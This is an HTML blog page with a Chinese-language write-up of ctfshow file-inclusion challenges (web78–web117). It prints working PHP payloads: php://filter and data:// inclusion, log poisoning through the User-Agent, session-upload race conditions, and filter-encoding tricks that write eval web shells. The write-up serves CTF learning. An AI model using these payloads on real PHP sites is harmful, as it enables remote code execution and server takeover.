@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>文件包含(ctfshow) | Secfeng</title>
+  <meta name="keywords" content=" 文件包含 ">
+  <meta name="description" content="文件包含(ctfshow) | Secfeng">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:site_name" content="Secfeng">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-05T11:53:12.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:09:40.008Z">
+<meta property="article:author" content="Secfeng">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Secfeng</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/secfeng"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(15)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="15">
+<input type="hidden" id="yelog_site_word_count" value="27.7k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>yii</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="yii"
+           data-author="" >
+            <span class="post-title" title="yii2框架反序列化漏洞复现">yii2框架反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-29 16:22:42">2023/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化">php反序列化</span>
+            <span class="post-date" title="2023-05-27 20:16:39">2023/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化(ctfshow)">php反序列化(ctfshow)</span>
+            <span class="post-date" title="2023-05-09 20:42:55">2023/05/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%B7%B7%E5%90%88)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(混合)">文件包含(混合)</span>
+            <span class="post-date" title="2023-04-25 15:59:18">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(ctfshow)">文件包含(ctfshow)</span>
+            <span class="post-date" title="2023-04-25 10:39:55">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(%E6%B7%B7%E5%90%88)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(混合)">文件上传(混合)</span>
+            <span class="post-date" title="2023-04-23 19:50:53">2023/04/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(upload-labs)">文件上传(upload-labs)</span>
+            <span class="post-date" title="2023-04-19 14:08:07">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(%E6%B7%B7%E5%90%88)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(混合)">命令执行(混合)</span>
+            <span class="post-date" title="2023-04-16 21:26:25">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/16/sql%E6%B3%A8%E5%85%A5(%E6%B7%B7%E5%90%88)/"
+           data-tag="sql"
+           data-author="" >
+            <span class="post-title" title="sql注入(混合)">sql注入(混合)</span>
+            <span class="post-date" title="2023-04-16 21:23:53">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"
+           data-tag="linux"
+           data-author="" >
+            <span class="post-title" title="linux学习">linux学习</span>
+            <span class="post-date" title="2023-04-14 22:24:49">2023/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(ctfshow)">命令执行(ctfshow)</span>
+            <span class="post-date" title="2023-04-09 19:52:07">2023/04/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php伪协议">php伪协议</span>
+            <span class="post-date" title="2023-04-04 22:21:18">2023/04/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php特性(ctfshow)">php特性(ctfshow)</span>
+            <span class="post-date" title="2023-04-03 15:56:51">2023/04/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xss%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss常见的触发标签">xss常见的触发标签</span>
+            <span class="post-date" title="2023-03-28 20:37:01">2023/03/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xsslabs/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xsslabs">xsslabs</span>
+            <span class="post-date" title="2023-03-28 16:24:23">2023/03/28</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-文件包含(ctfshow)" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">文件包含(ctfshow)</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">文件包含</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-04-27 17:31:38'>2023-04-25 10:39</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:3.5k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web78"><span class="toc-text">web78</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web79"><span class="toc-text">web79</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web80"><span class="toc-text">web80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web81"><span class="toc-text">web81</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web82-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">web82-session文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web83"><span class="toc-text">web83</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web84"><span class="toc-text">web84</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web85"><span class="toc-text">web85</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web86"><span class="toc-text">web86</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web87"><span class="toc-text">web87</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web88"><span class="toc-text">web88</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web116"><span class="toc-text">web116</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web117"><span class="toc-text">web117</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>看源码：</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/110856.png" class="">
+
+<p>直接构造?file&#x3D;flag.php，没有结果，因为只是包含了php文件，而php代码是不会显示在前端的</p>
+<p>1.可以使用php:&#x2F;&#x2F;filter伪协议：</p>
+<pre><code>payload：?file=php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<p>2.bp抓包，给file传参?file&#x3D;php:&#x2F;&#x2F;input然后在post输出想要执行的代码</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/150032.png" class="">
+
+<p>3.也可以用data伪协议</p>
+<pre><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;
+?file=data://text/plain,&lt;?=eval($_POST[1])?&gt;
+</code></pre>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>这一关用???代替了php</p>
+<p>1.使用data协议：</p>
+<pre><code>?file=data://text/plain,&lt;?Php system(&#39;tac flag.php&#39;);?&gt; //注意&lt;?php第一个p大写
+?file=data://text/plain,&lt;?= system(&#39;tac flag.php&#39;);?&gt; 
+?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=
+</code></pre>
+<p>2.php:&#x2F;&#x2F;input伪协议</p>
+<pre><code>?file=Php://input
+再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;
+</code></pre>
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>php和data都被替换了</p>
+<p>1.php:&#x2F;&#x2F;input伪协议（大小写绕过）</p>
+<pre><code>?file=Php://input
+再post：&lt;?php system(&quot;tac flag.php&quot;);?&gt;
+</code></pre>
+<p>2.日志文件包含，伪造UA写入php代码</p>
+<p>日志文件记录了服务器收到的每一次请求的</p>
+<p>IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</p>
+<p>nginx日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>先写入日志：</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/201035.png" class="">
+
+<p>再包含日志，执行代码：</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class="">
+
+<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>这道题过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含，同上题</p>
+<h3 id="web82-session文件包含"><a href="#web82-session文件包含" class="headerlink" title="web82-session文件包含"></a>web82-session文件包含</h3><p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120106832">https://blog.csdn.net/qq_46918279/article/details/120106832</a></p>
+<pre><code class="markdown">PHP里面唯一我们能控制的没有后缀的文件就是session文件
+利用PHP_SESSION_UPLOAD_PROGRESS写入session文件加条件竞争达到文件包含的目的
+
+1. session.upload_progress.enabled = on
+2. session.upload_progress.cleanup = on（默认开启）
+3. session.upload_progress.prefix = &quot;upload_progress_&quot;（默认）
+4. session.upload_progress.name = &quot;$PHP_SESSION_UPLOAD_PROGRESS&quot;（默认）
+enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；
+cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容
+name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控也就是PHP_SESSION_UPLOAD_PROGRESS的值可控；
+prefix+name将表示为session中的键名
+</code></pre>
+<pre><code class="markdown">大体思路为：
+1、post一个与ini中设置的session.upload_progress.name的同名变量（默认的name为“PHP_SESSION_UPLOAD_PROGRESS”），那么就会返回上传文件的实时进度并写入session文件中。session文件的内容为:（它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）
+2、如果我们post传递PHP_SESSION_UPLOAD_PROGRESS的值为一句话木马
+比如为：&lt;?php system(&#39;ls&#39;);?&gt;
+3、同时，我们在cookie里面设置名字：PHPSESSID，值：flag，（目的是设置session文件，因为这样我们才能知道实时进度（一句话木马）上传到哪里了）；那么在/tem/sess_flag这个文件的内容就为upload_progress_&lt;?php system(&#39;ls&#39;)?&gt;。然后在include（/tem/sess_flag）就会执行后面的php代码从而成功执行rce。
+4、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问/tem/sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件。
+</code></pre>
+<p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</p>
+<p>操作：1、先构造一个上传文件的页面，对环境上传一个任意的文件，内容也任意，然后抓包。</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://dadcfcfb-217c-4393-817b-acf2a96574b7.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>2、 修改上传文件包</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/233813.png" class="">
+
+<p>注意两点：</p>
+<p>（1）设置Cookie：PHPSEESSID&#x3D;flag、这样我们的session就为&#x2F;tmp&#x2F;sess_flag</p>
+<p>（2）设置同名变量PHP_SESSION_UPLOAD_PROGRESS，设置值为我们想要存入session文件的代码。（把第一步中value&#x3D;123的改掉即可，这里对123加上§§是为了进行爆破payload用）<br>3、包含session文件，抓包</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/234110.png" class="">
+
+<p>这里§a§是为了方便爆破用</p>
+<p>4、进行爆破</p>
+<p>payload数量可以设置10000次，也可以使用无数次。</p>
+<p>设置线程数（用了30）</p>
+<p>然后一起爆破（先对上传文件包点击attack，在对&#x2F;tmp&#x2F;sess_flag文件包含包点击attack，也可以不管顺序，因为爆破次数有很多）</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/235457.png" class="">
+
+<p> 最后将ls改成tac fl0g.php就行 </p>
+<h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><p><strong>session_unset();</strong><br>释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的sessionid<br><strong>session_destroy();</strong><br>删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留<br>所以这两个函数等同于将内存中的$_SESSION变量释放且删除了session文件和释放sessionid，我们是无法进行session文件包含的。但是：我们的脚本或者bp仍然能够进行包含。原因在于多线程竞争：</p>
+<pre><code class="markdown">什么是多线程竞争
+线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:
+数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。
+这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。
+怎么解决多线程竞争问题?---锁
+锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。
+锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了
+锁的致命问题: 死锁 
+</code></pre>
+<h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><p>system(“rm -rf &#x2F;tmp&#x2F;*”)会强制删除&#x2F;tmp&#x2F;下的所有文件</p>
+<p>还是web82的方法，多线程竞争理解</p>
+<h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 true，否则返回 false。</p>
+<p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 false。</p>
+<p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。</p>
+<p>还是web82的方法、同样的道理：多线程竞争理解</p>
+<h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><p>知识点：</p>
+<pre><code class="markdown">define — 定义一个常量
+dirname：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（&#39;.&#39;），表示当前目录。否则返回的是把 path 中结尾的/component（最后一个斜线以及后面部分）去掉之后的字符串。
+set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 false。
+include
+被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。
+如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix/Linux 下以 / 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path都会被完全忽略。例如一个文件以 ../ 开头，则解析器会在当前目录的父目录下寻找该文件。
+</code></pre>
+<p>还是web82的方法、同样的道理：多线程竞争理解</p>
+<p>因为设置了目录&#x2F;tmp&#x2F;sess_flag，所以set_include_path对我们的脚本没有用。</p>
+<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><pre><code class="php">&lt;?php
+if(isset($_GET[&#39;file&#39;]))&#123;
+    $file = $_GET[&#39;file&#39;];
+    $content = $_POST[&#39;content&#39;];
+    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);
+    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);
+    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">谈一谈php:&#x2F;&#x2F;filter的妙用</a></p>
+<p>​		<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p>
+<p>方法1：base64编码</p>
+<p>这道题，向文件输入内容的时候会在开头写入死亡函数，从而导致直接结束代码的执行，我们要做的就是绕过这个死亡函数。</p>
+<p>编码时，转换成Base64的最小单位就是3个字节</p>
+<p>解码时，4个字节为一组；PHP在解码base64时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64的字符选用了”A-Z、a-z、0-9、+、&#x2F;“ 64个可打印字符）所以，通过base64解码过滤之后就只有 phpdie6  个字符我们就要添加2个字符让phpdie和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。</p>
+<p>其次：因为filename那里需要urldecode，而get传参的时候会进行一次urldecode，所以我们的filename需要两次urlencode。?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php这里需要进行url全编码，不然php会被过滤掉。<br>将&lt;?php eval($_POST[1]);?&gt;进行base64编码为：PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+，注意如果直接传入content，这里的+会被当做空格处理，所以在base64解码的时候就会忽略空格，自动在后面加上一个&#x3D;：即PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8&#x3D;，解码后：&lt;?php eval($_POST[1]);?   这样传进去就会报错</p>
+<p>解决方法：将+进行urlencode或直接去掉?&gt;</p>
+<img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class="">
+
+<p>方法2：rot13编码</p>
+<p>条件：在PHP不开启short_open_tag（短标签）时</p>
+<pre><code>payload:?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30
+//?file=php://filter/write=string.rot13/resource=3.php
+
+//对写的内容进行rot13编码。
+content=&lt;?cuc riny($_CBFG[1]);?&gt;
+
+//&lt;?php eval($_POST[1]);?&gt;
+//rot13两次解码后会变成原来的样子。所以我们将传入的content进行一次rot13编码，然后在写入3.php的时候在进行rot13编码，那么写入文件的时候就会写入&lt;?php eval($_POST[1]);?&gt;。
+//而&lt;?php die(&#39;大佬别秀了&#39;);?&gt;只会进行一次rot13编码，写入文件的时候就不是一个正常的php代码格式。
+</code></pre>
+<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>这关过滤了很多，但有个data没有过滤</p>
+<pre><code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8%2B //+号可以用%2b编码
+
+data://text/plain;base64,&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;
+</code></pre>
+<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>misc,看起来比较麻烦，先放着</p>
+<h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌</a></p>
+<p>这关没有过滤php，那么我们就可以通过php:&#x2F;&#x2F;filter&#x2F;write来写入文件，然后通过编码绕过死亡函数，因为这里过滤了base64和rot13，string，所以得用其他的编码。</p>
+<pre><code>convert.iconv.
+这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;;其用法：iconv ( string $in_charset , string $out_charset , string $str ) : string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于base_convert的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；
+那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；
+</code></pre>
+<p><strong>usc-2</strong>编码：这个是将前后两个字符进行交替(abcd&#x3D;&#x3D;&gt;badc)，所以写入文件的&lt;?php die();?&gt;就会被扰乱，从而绕过。</p>
+<pre><code>get: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
+post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?
+
+然后访问1.php 
+post:1=system(&#39;tac f*&#39;);
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
